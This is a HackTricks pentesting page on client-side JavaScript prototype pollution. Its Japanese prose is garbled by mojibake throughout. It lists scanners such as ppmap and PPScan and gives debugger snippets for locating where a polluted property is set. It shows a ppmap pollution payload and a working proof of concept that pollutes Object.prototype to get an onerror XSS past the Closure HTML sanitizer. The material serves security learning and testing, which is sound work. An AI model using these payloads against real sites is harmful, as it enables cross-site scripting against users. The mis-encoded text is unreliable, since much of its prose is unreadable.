# ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ç™ºè¦‹ã™ã‚‹

ãƒ„ãƒ¼ãƒ«[**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**ã€**[**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap)**ã€**[**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find)**ã‚’ä½¿ç”¨ã—ã¦ã€**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½**[**PPScan**](https://github.com/msrkp/PPScan)ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ãƒšãƒ¼ã‚¸**ã‚’**è‡ªå‹•çš„ã«ã‚¹ã‚­ãƒ£ãƒ³**ã—ã¦ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

### ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®ä½¿ç”¨ç®‡æ‰€ã®ãƒ‡ãƒãƒƒã‚° <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®æ ¹æœ¬åŸå› ã®ç‰¹å®š <a href="#5530" id="5530"></a>

ãƒ„ãƒ¼ãƒ«ã®ã„ãšã‚Œã‹ãŒ**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§**ã‚’**ç‰¹å®š**ã—ãŸå ´åˆã€ã‚‚ã—**ã‚³ãƒ¼ãƒ‰**ãŒ**éå¸¸ã«è¤‡é›‘ã§ãªã„**å ´åˆã¯ã€Chrome Developer Toolsã§JSã‚³ãƒ¼ãƒ‰ã‚’æ¤œç´¢ã—ã€**`location.hash/decodeURIComponent/location.search`**ã¨ã„ã†ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã¦è„†å¼±ãªç®‡æ‰€ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚³ãƒ¼ãƒ‰ãŒå¤§ããè¤‡é›‘ãªå ´åˆã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã®å ´æ‰€ã‚’**ç‰¹å®šã™ã‚‹ç°¡å˜ãªæ–¹æ³•**ãŒã‚ã‚Šã¾ã™ï¼š

* ãƒ„ãƒ¼ãƒ«ã®ã„ãšã‚Œã‹ã‚’ä½¿ç”¨ã—ã¦**è„†å¼±æ€§ã‚’è¦‹ã¤ã‘**ã€ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã«**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¨­å®šã™ã‚‹**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å–å¾—ã—ã¾ã™ã€‚ppmapã§ã¯ã€`constructor[prototype][ppmap]=reserved`ã®ã‚ˆã†ãªã‚‚ã®ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚
* ä»Šã€ãƒšãƒ¼ã‚¸ã§å®Ÿè¡Œã•ã‚Œã‚‹**æœ€åˆã®è¡Œã®JSã‚³ãƒ¼ãƒ‰ã«ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è¨­å®š**ã—ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒšãƒ¼ã‚¸ã‚’ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€å®Ÿè¡ŒãŒãã“ã§ä¸€æ™‚åœæ­¢ã—ã¾ã™ã€‚
* JSã®å®Ÿè¡ŒãŒä¸€æ™‚åœæ­¢ã—ã¦ã„ã‚‹é–“ã«ã€**æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’JSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«è²¼ã‚Šä»˜ã‘ã¾ã™**ã€‚ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ 'ppmap' ãŒä½œæˆã•ã‚ŒãŸã“ã¨ã‚’ç¤ºã™ãŸã‚ã€ã©ã“ã§ä½œæˆã•ã‚ŒãŸã‹ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
**ã‚½ãƒ¼ã‚¹**ã«æˆ»ã‚Šã€ã€Œ**ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã‚’å†é–‹**ã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã™ã¹ã¦ã®**JavaScript**ãŒå®Ÿè¡Œã•ã‚Œã€ppmapãŒäºˆæƒ³ã©ãŠã‚Šã«æ±šæŸ“ã•ã‚Œã¾ã™ã€‚ã‚¹ãƒ‹ãƒšãƒƒãƒˆã®åŠ©ã‘ã‚’å€Ÿã‚Šã¦ã€ppmapãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒå…·ä½“çš„ã«ã©ã“ã§æ±šæŸ“ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ã‚³ãƒ¼ãƒ«ã‚¹ã‚¿ãƒƒã‚¯**ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€æ±šæŸ“ãŒç™ºç”Ÿã—ãŸ**ç•°ãªã‚‹ã‚¹ã‚¿ãƒƒã‚¯**ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

ã—ã‹ã—ã€ã©ã‚Œã‚’é¸ã¶ã¹ãã§ã—ã‚‡ã†ã‹ï¼Ÿã»ã¨ã‚“ã©ã®å ´åˆã€Prototype Pollutionã¯JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ç™ºç”Ÿã—ã¾ã™ã®ã§ã€ã‚¹ã‚¿ãƒƒã‚¯ãŒ.jsãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ•ã‚¡ã‚¤ãƒ«ã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã‚‹ã‚¹ã‚¿ãƒƒã‚¯ã‚’ç›®æŒ‡ã—ã¾ã™ï¼ˆç”»åƒã®å³å´ã‚’è¦‹ã¦ã€ã©ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¹ã‚¿ãƒƒã‚¯ãŒé–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼‰ã€‚ã“ã®å ´åˆã€4è¡Œç›®ã¨6è¡Œç›®ã«2ã¤ã®ã‚¹ã‚¿ãƒƒã‚¯ãŒã‚ã‚Šã¾ã™ãŒã€è«–ç†çš„ã«ã¯4è¡Œç›®ã‚’é¸æŠã—ã¾ã™ã€‚ãªãœãªã‚‰ã€ã“ã®è¡ŒãŒæ±šæŸ“ãŒç™ºç”Ÿã™ã‚‹æœ€åˆã®ç®‡æ‰€ã§ã‚ã‚Šã€ã¤ã¾ã‚Šã“ã®è¡ŒãŒè„†å¼±æ€§ã®åŸå› ã§ã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚ã‚¹ã‚¿ãƒƒã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã¾ã™ã€‚

![](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¬ã‚¸ã‚§ãƒƒãƒˆã®æ¤œç´¢

ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¨ã¯ã€**PPã®è„†å¼±æ€§ãŒç™ºè¦‹ã•ã‚ŒãŸã¨ãã«æ‚ªç”¨ã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰**ã®ã“ã¨ã§ã™ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚·ãƒ³ãƒ—ãƒ«ãªå ´åˆã€**`srcdoc/innerHTML/iframe/createElement`**ãªã©ã®**ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰**ã‚’æ¤œç´¢ã—ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã—ã¦JavaScriptã®å®Ÿè¡Œã«ã¤ãªãŒã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã§ãã¾ã™ã€‚æ™‚ã«ã¯ã€ã“ã‚Œã‚‰ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦ã‚‚ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ãã®å ´åˆã€ç´”ç²‹ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ãƒ¬ãƒ“ãƒ¥ãƒ¼ã«ã‚ˆã£ã¦ã€ä»¥ä¸‹ã®ä¾‹ã®ã‚ˆã†ãªç´ æ™´ã‚‰ã—ã„ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒæ˜ã‚‰ã‹ã«ãªã‚Šã¾ã™ã€‚

### Mithilãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ã‚³ãƒ¼ãƒ‰ã§PPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ä¾‹

ã“ã®è§£èª¬ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š[https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å†ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PPã‚’ä»‹ã—ãŸHTMLã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ã®ãƒã‚¤ãƒ‘ã‚¹

[**ã“ã®ç ”ç©¶**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)ã§ã¯ã€ä¸€éƒ¨ã®HTMLã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒæä¾›ã™ã‚‹ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã‚’**ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã®PPã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## å‚è€ƒæ–‡çŒ®

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
